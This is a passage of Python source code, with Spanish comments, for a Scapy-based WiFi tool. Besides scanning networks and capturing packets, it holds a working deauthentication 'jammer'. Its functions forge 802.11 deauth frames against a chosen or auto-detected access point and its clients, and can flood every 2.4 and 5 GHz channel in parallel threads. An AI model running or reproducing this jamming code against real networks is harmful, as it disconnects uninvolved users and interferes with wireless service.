                        captured = sniff(iface=interface, count=20, timeout=0.1, quiet=True)
                        
                        for packet in captured:
                            wifi_pkt = self._parse_packet(packet)
                            if wifi_pkt:
                                packets_captured += 1
                                # Añadir al buffer
                                try:
                                    self.packet_buffer.add(wifi_pkt)
                                except:
                                    pass
                    except:
                        pass
                
                # Pequeña pausa para no saturar
                time.sleep(0.05)
            
            # Obtener todos los paquetes del buffer capturados en este canal
            all_packets = self.packet_buffer.peek(500)  # Revisar más paquetes
            
            for pkt in all_packets:
                if isinstance(pkt, WiFiPacket) and pkt.bssid:
                    # Filtrar BSSID de broadcast (FF:FF:FF:FF:FF:FF) - no es una red real
                    if pkt.bssid.upper() == "FF:FF:FF:FF:FF:FF" or pkt.bssid.upper() == "FFFFFFFFFFFF":
                        continue
                    
                    # Solo procesar Beacons, ProbeResp o paquetes con SSID (redes reales)
                    if pkt.packet_type in ["Beacon", "ProbeResp"] or pkt.ssid:
                        key = pkt.bssid
                        # Si no hay SSID pero es un Beacon, marcar como hidden
                        ssid_value = pkt.ssid if (pkt.ssid and pkt.ssid != "<hidden>") else "<hidden>"
                        
                        # Actualizar o agregar red (usar mejor RSSI si ya existe)
                        if key not in networks:
                            networks[key] = WiFiNetwork(
                                ssid=ssid_value,
                                bssid=pkt.bssid,
                                channel=pkt.channel,
                                rssi=pkt.rssi,
                                encryption="Unknown",
                                last_seen=pkt.timestamp
                            )
                        else:
                            # Actualizar si este paquete tiene mejor RSSI o SSID más reciente
                            if pkt.rssi > networks[key].rssi or (not networks[key].ssid and ssid_value != "<hidden>"):
                                networks[key].rssi = pkt.rssi
                                networks[key].channel = pkt.channel
                                networks[key].last_seen = pkt.timestamp
                                if ssid_value != "<hidden>" or not networks[key].ssid:
                                    networks[key].ssid = ssid_value
        
        # Actualizar cache de redes
        self.networks.update(networks)
        
        # Ordenar por RSSI (mayor primero)
        network_list = sorted(networks.values(), key=lambda n: n.rssi, reverse=True)
        return network_list
    
    def scan_channels(self, start_channel: int, end_channel: int, callback=None) -> List[Tuple[int, int]]:
        """Escanea canales y retorna lista de (canal, rssi) con mejoras"""
        results = []
        channels_to_scan = []
        
        # Construir lista de canales a escanear
        for ch in range(start_channel, end_channel + 1):
            if ch in self.CHANNELS_2_4 or ch in self.CHANNELS_5:
                channels_to_scan.append(ch)
        
        for channel in channels_to_scan:
            self.set_channel(channel)
            time.sleep(0.15)  # Más tiempo para capturar paquetes
            
            # Obtener RSSI promedio de múltiples muestras
            rssi = self.get_channel_rssi_avg()
            results.append((channel, rssi))
            
            if callback:
                callback(channel, rssi)
        
        return results
    
    def get_channel_rssi_avg(self) -> int:
        """Obtiene RSSI promedio del canal actual (mejorado)"""
        if not SCAPY_AVAILABLE or not self.monitor_mode:
            return -100
        
        try:
            # Obtener paquetes del buffer recientes
            rssi_values = []
            packets = self.packet_buffer.peek(20)
            
            for pkt in packets:
                if isinstance(pkt, WiFiPacket) and pkt.channel == self.current_channel:
                    if -100 <= pkt.rssi <= 0:
                        rssi_values.append(pkt.rssi)
            
            if rssi_values:
                return int(sum(rssi_values) / len(rssi_values))
        
        except:
            pass
        
        return -100
    
    def receive_packet(self, timeout: float = 1.0) -> Optional[bytes]:
        """Recibe un paquete WiFi (mejorado con buffer)"""
        if not self.monitor_mode:
            return None
        
        try:
            # Intentar obtener del buffer primero
            if not self.packet_queue.empty():
                wifi_pkt = self.packet_queue.get(timeout=0.1)
                if wifi_pkt:
                    return wifi_pkt.data
            
            # Fallback: captura directa
            if SCAPY_AVAILABLE:
                interface = self.monitor_interface or self.interface
                packet = sniff(iface=interface, count=1, timeout=timeout, quiet=True)
                
                if packet:
                    wifi_pkt = self._parse_packet(packet[0])
                    if wifi_pkt:
                        return wifi_pkt.data
        
        except queue.Empty:
            pass
        except Exception:
            pass
        
        return None
    
    def send_packet(self, data: bytes) -> bool:
        """Envía un paquete WiFi con mejor manejo de errores"""
        if not SCAPY_AVAILABLE:
            return False
        
        if not self.monitor_mode:
            print("ERROR: Modo monitor no activado. No se pueden enviar paquetes.")
            return False
        
        try:
            interface = self.monitor_interface or self.interface
            if not interface:
                return False
            
            # Si los datos son un paquete Scapy completo
            try:
                packet = RadioTap(data)
                sendp(packet, iface=interface, verbose=False, count=1)
                self.packets_sent += 1
                return True
            except:
                pass
            
            # Si son datos raw, crear un paquete básico
            try:
                packet = RadioTap() / Dot11(type=2, subtype=0) / data
                sendp(packet, iface=interface, verbose=False, count=1)
                self.packets_sent += 1
                return True
            except Exception as e:
                print(f"ERROR enviando paquete: {e}")
                return False
        
        except Exception as e:
            print(f"ERROR en send_packet: {e}")
            return False
    
    def export_pcap(self, filename: str, packet_count: int = 100) -> bool:
        """Exporta paquetes a archivo PCAP (compatible con Wireshark)"""
        if not SCAPY_AVAILABLE:
            return False
        
        try:
            packets_to_export = []
            buffer_packets = self.packet_buffer.peek(packet_count)
            
            for wifi_pkt in buffer_packets:
                if isinstance(wifi_pkt, WiFiPacket):
                    try:
                        packet = RadioTap(wifi_pkt.data)
                        packets_to_export.append(packet)
                    except:
                        pass
            
            if packets_to_export:
                wrpcap(filename, packets_to_export)
                print(f"Exportados {len(packets_to_export)} paquetes a {filename}")
                return True
            else:
                print("No hay paquetes para exportar")
                return False
        
        except Exception as e:
            print(f"ERROR exportando PCAP: {e}")
            return False
    
    def _send_deauth_packets(self, target_bssid: str, client_mac: Optional[str] = None, 
                            interface: str = None, count: int = 0, inter: float = 0.1) -> bool:
        """Envía paquetes de deautenticación usando Scapy directamente (mejora basada en Wi-Fi-Jammer)
        
        Args:
            target_bssid: BSSID del AP objetivo
            client_mac: MAC del cliente (None = broadcast)
            interface: Interfaz a usar
            count: Número de paquetes (0 = infinito)
            inter: Intervalo entre paquetes en segundos
        """
        if not SCAPY_AVAILABLE:
            print("ERROR: scapy no está disponible")
            return False
        
        if not interface:
            interface = self.monitor_interface or self.interface
        
        if not interface:
            return False
        
        try:
            pkts = []
            
            if client_mac:
                # Deauth dirigido: cliente -> AP y AP -> cliente
                deauth_pkt1 = RadioTap() / Dot11(
                    addr1=client_mac.lower(),  # Destino: cliente
                    addr2=target_bssid.lower(),  # Fuente: AP
                    addr3=target_bssid.lower()  # BSSID: AP
                ) / Dot11Deauth()
                
                deauth_pkt2 = RadioTap() / Dot11(
                    addr1=target_bssid.lower(),  # Destino: AP
                    addr2=client_mac.lower(),  # Fuente: cliente
                    addr3=target_bssid.lower()  # BSSID: AP
                ) / Dot11Deauth()
                
                pkts = [deauth_pkt1, deauth_pkt2]
            else:
                # Deauth broadcast: desconectar todos los clientes del AP
                deauth_pkt = RadioTap() / Dot11(
                    addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
                    addr2=target_bssid.lower(),  # Fuente: AP
                    addr3=target_bssid.lower()  # BSSID: AP
                ) / Dot11Deauth()
                
                pkts = [deauth_pkt]
            
            # Enviar paquetes
            # Si count es 0 (infinito), enviar en loop hasta que jamming_active sea False
            if count == 0:
                while self.jamming_active:
                    for pkt in pkts:
                        if not self.jamming_active:
                            break
                        sendp(pkt, iface=interface, count=1, inter=inter, verbose=False)
            else:
                for pkt in pkts:
                    sendp(pkt, iface=interface, count=count, inter=inter, verbose=False)
            
            return True
        
        except Exception as e:
            print(f"ERROR enviando paquetes deauth: {e}")
            return False
    
    def _jam_channel_loop(self, channel: int, target_bssid: Optional[str] = None, 
                         client_mac: Optional[str] = None):
        """Loop de jamming en un canal específico usando Scapy directo"""
        interface = self.monitor_interface or self.interface
        if not interface:
            return
        
        problematic_channels = [52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144]
        
        while self.jamming_active:
            try:
                # Cambiar a este canal
                if not self.set_channel(channel, silent=True):
                    if channel in problematic_channels:
                        time.sleep(2)
                    else:
                        time.sleep(0.5)
                    continue
                
                time.sleep(0.2)  # Pausa después de cambiar canal
                
                # Determinar BSSID objetivo
                actual_bssid = target_bssid
                if not actual_bssid:
                    # Buscar APs en este canal
                    with self.clients_APs_lock:
                        for ap in self.APs:
                            if str(channel) == ap[1]:  # Canal coincide
                                actual_bssid = ap[0]
                                break
                    
                    # Si no hay APs conocidos, usar broadcast
                    if not actual_bssid:
                        actual_bssid = 'ff:ff:ff:ff:ff:ff'
                
                # Enviar paquetes deauth continuamente en loop
                while self.jamming_active:
                    try:
                        # Construir paquetes
                        pkts = []
                        if client_mac:
                            deauth_pkt1 = RadioTap() / Dot11(
                                addr1=client_mac.lower(),
                                addr2=actual_bssid.lower(),
                                addr3=actual_bssid.lower()
                            ) / Dot11Deauth()
                            deauth_pkt2 = RadioTap() / Dot11(
                                addr1=actual_bssid.lower(),
                                addr2=client_mac.lower(),
                                addr3=actual_bssid.lower()
                            ) / Dot11Deauth()
                            pkts = [deauth_pkt1, deauth_pkt2]
                        else:
                            deauth_pkt = RadioTap() / Dot11(
                                addr1='ff:ff:ff:ff:ff:ff',
                                addr2=actual_bssid.lower(),
                                addr3=actual_bssid.lower()
                            ) / Dot11Deauth()
                            pkts = [deauth_pkt]
                        
                        # Enviar paquetes
                        for pkt in pkts:
                            if not self.jamming_active:
                                break
                            sendp(pkt, iface=interface, count=1, inter=0.05, verbose=False)
                        
                        time.sleep(0.05)  # Pausa entre ciclos
                    except Exception as e:
                        time.sleep(0.1)
                        continue
            
            except Exception as e:
                time.sleep(1)
                continue
    
    def start_jamming(self, target_bssid: Optional[str] = None, channel: Optional[int] = None, 
                     jam_mode: str = "channel") -> bool:
        """Inicia jamming WiFi usando Scapy directamente (mejora basada en Wi-Fi-Jammer)
        
        Args:
            target_bssid: BSSID objetivo (None = auto-detectar o broadcast)
            channel: Canal específico (None = canal actual, solo para jam_mode="channel")
            jam_mode: Modo de jamming:
                - "channel": Canal específico (2.4 o 5 GHz)
                - "band_2_4": Todos los canales 2.4 GHz (1-14)
                - "band_5": Todos los canales 5 GHz (36-165)
                - "all": Todos los canales en ambas bandas (2.4 y 5 GHz)
        """
        if not SCAPY_AVAILABLE:
            print("ERROR: scapy no está disponible. Instala con: pip install scapy")
            return False
        
        try:
            interface = self.monitor_interface or self.interface
            if not interface:
                return False
            
            # Detener cualquier jamming activo antes de iniciar uno nuevo
            self.stop_jamming()
            
            if jam_mode == "channel":
                # Jamming en canal específico usando Scapy directo
                if channel:
                    self.set_channel(channel)
                
                # Verificar que estamos en modo monitor
                if not self.monitor_mode:
                    print("ERROR: Modo monitor no activo. Activando...")
                    if not self.set_monitor_mode(True):
                        print("ERROR: No se pudo activar modo monitor.")
                        return False
                
                # Si no se especifica BSSID, buscar uno automáticamente en el canal actual
                actual_bssid = target_bssid
                if not actual_bssid:
                    print(f"Buscando APs en canal {self.current_channel}...")
                    # Buscar en la lista de APs detectados
                    with self.clients_APs_lock:
                        for ap in self.APs:
                            if str(self.current_channel) == ap[1]:  # Canal coincide
                                actual_bssid = ap[0]
                                print(f"AP encontrado: {actual_bssid} (canal {self.current_channel}, SSID: {ap[2]})")
                                break
                    
                    # Si no hay APs conocidos, usar broadcast
                    if not actual_bssid:
                        actual_bssid = 'ff:ff:ff:ff:ff:ff'
                        print(f"Usando broadcast (no se encontraron APs en canal {self.current_channel})")
                
                # Iniciar jamming con Scapy directo en thread separado
                self.jamming_active = True
                self.jam_thread = threading.Thread(
                    target=self._jam_channel_loop,
                    args=(self.current_channel, actual_bssid, None),
                    daemon=True
                )
                self.jam_thread.start()
                
                print(f"\n✓ Jamming iniciado correctamente (Scapy directo)")
                print(f"  Interfaz: {interface}")
                print(f"  Canal: {self.current_channel}")
                print(f"  BSSID: {actual_bssid}")
                print(f"\nPara detener: jam (de nuevo) o x\n")
                
                return True
            
            else:
                # Jamming en múltiples canales usando Scapy directo
                self.jamming_active = True
                self.jam_all_bands_active = True
                
                # Determinar canales a usar
                if jam_mode == "band_2_4":
                    channels_to_jam = self.CHANNELS_2_4
                    print(f"Iniciando jamming en banda 2.4 GHz ({len(channels_to_jam)} canales)...")
                elif jam_mode == "band_5":
                    channels_to_jam = self.CHANNELS_5
                    print(f"Iniciando jamming en banda 5 GHz ({len(channels_to_jam)} canales)...")
                elif jam_mode == "all":
                    channels_to_jam = self.CHANNELS_2_4 + self.CHANNELS_5
                    print(f"Iniciando jamming en todas las bandas ({len(channels_to_jam)} canales)...")
                else:
                    channels_to_jam = [self.current_channel]
                
                # Crear un thread por cada canal para saturación simultánea
                self.jam_threads = []
                for channel in channels_to_jam:
                    thread = threading.Thread(
                        target=self._jam_channel_loop,
                        args=(channel, target_bssid, None),
                        daemon=True
                    )
                    thread.start()
                    self.jam_threads.append(thread)
                
                print(f"✓ Jamming iniciado en {len(channels_to_jam)} canales (Scapy directo)")
                print(f"  Interfaz: {interface}")
                print(f"  BSSID: {target_bssid or 'Auto-detectado/Broadcast'}")
                print(f"\nPara detener: jam (de nuevo) o x\n")
                
                return True
        
        except FileNotFoundError:
            print("ERROR: aireplay-ng no encontrado. Instala con: sudo apt install aircrack-ng")
            return False
        except Exception as e:
            print(f"ERROR iniciando jamming: {e}")
            return False
    
    def stop_jamming(self):
        """Detiene el jamming con mejor manejo"""
        try:
            # Detener jamming de banda completa
            if hasattr(self, 'jam_all_bands_active'):
                self.jam_all_bands_active = False
                if hasattr(self, 'jam_thread') and self.jam_thread:
                    self.jam_thread.join(timeout=2)
            
            # Detener proceso de jamming normal
            if hasattr(self, 'jam_process') and self.jam_process:
                try:
                    # Intentar terminar suavemente
                    self.jam_process.terminate()
                    try:
                        self.jam_process.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        # Si no termina, forzar
                        self.jam_process.kill()
                        self.jam_process.wait(timeout=1)
                except (ProcessLookupError, ValueError):
                    # Proceso ya terminó
                    pass
                except Exception as e:
                    # Otro error, intentar kill
                    try:
                        self.jam_process.kill()
                        self.jam_process.wait(timeout=1)
                    except:
                        pass
        except Exception as e:
            print(f"Advertencia al detener jamming: {e}")
    
    def stop_jamming(self):
        """Detiene el jamming con mejor manejo (actualizado para Scapy directo)"""
        try:
            # Detener flag de jamming
            self.jamming_active = False
            self.jam_all_bands_active = False
            
            # Detener threads de jamming
            if hasattr(self, 'jam_threads') and self.jam_threads:
                for thread in self.jam_threads:
                    if thread and thread.is_alive():
                        # El thread se detendrá automáticamente cuando jamming_active sea False
                        pass
                self.jam_threads = []
            
            # Detener thread de jamming único
            if hasattr(self, 'jam_thread') and self.jam_thread:
                if self.jam_thread.is_alive():
                    # El thread se detendrá automáticamente cuando jamming_active sea False
                    self.jam_thread.join(timeout=2)
            
            # Detener procesos antiguos de aireplay-ng (por si acaso)
            if hasattr(self, 'jam_process') and self.jam_process:
                try:
                    self.jam_process.terminate()
                    try:
                        self.jam_process.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        self.jam_process.kill()
                        self.jam_process.wait(timeout=1)
                except (ProcessLookupError, ValueError):
                    pass
                except Exception:
                    try:
                        self.jam_process.kill()
                        self.jam_process.wait(timeout=1)
                    except:
                        pass
                self.jam_process = None
            
            # Detener procesos múltiples (por si acaso)
            if hasattr(self, 'jam_processes') and self.jam_processes:
                for process in self.jam_processes:
                    try:
                        process.terminate()
                        process.wait(timeout=1)
                    except:
                        try:
                            process.kill()
                            process.wait(timeout=1)
                        except:
                            pass
                self.jam_processes = []
        
        except Exception as e:
            print(f"Advertencia al detener jamming: {e}")
    
    def check_receive_flag(self) -> bool:
        """Verifica si hay paquetes disponibles (mejorado con buffer)"""
        return not self.packet_queue.empty()
    
    def receive_data(self, buffer: bytearray) -> int:
        """Recibe datos y los coloca en el buffer (similar a CC1101)"""
        if not self.monitor_mode:
            return 0
        
        try:
            # Intentar obtener del buffer primero
            if not self.packet_queue.empty():
                wifi_pkt = self.packet_queue.get_nowait()
                if wifi_pkt:
                    data = wifi_pkt.data
                    length = min(len(data), len(buffer))
                    buffer[:length] = data[:length]
                    return length
            
            # Fallback: captura directa
            packet = self.receive_packet(timeout=0.05)
            if packet:
                length = min(len(packet), len(buffer))
                buffer[:length] = packet[:length]
                return length
        
        except queue.Empty:
            pass
        except Exception as e:
            pass
        
        return 0
    
    def send_data(self, data: bytes, length: Optional[int] = None) -> bool:
        """Envía datos (similar a CC1101)"""
        if length:
            data = data[:length]
        return self.send_packet(data)
    
    def cleanup(self):
        """Limpia recursos de forma segura"""
        try:
            self._stop_capture_thread()
            self.stop_jamming()
            if self.monitor_mode:
                self.set_monitor_mode(False)
            self.packet_buffer.clear()
            while not self.packet_queue.empty():
                try:
                    self.packet_queue.get_nowait()
                except queue.Empty:
                    break
        except Exception as e:
            print(f"Advertencia durante cleanup: {e}")
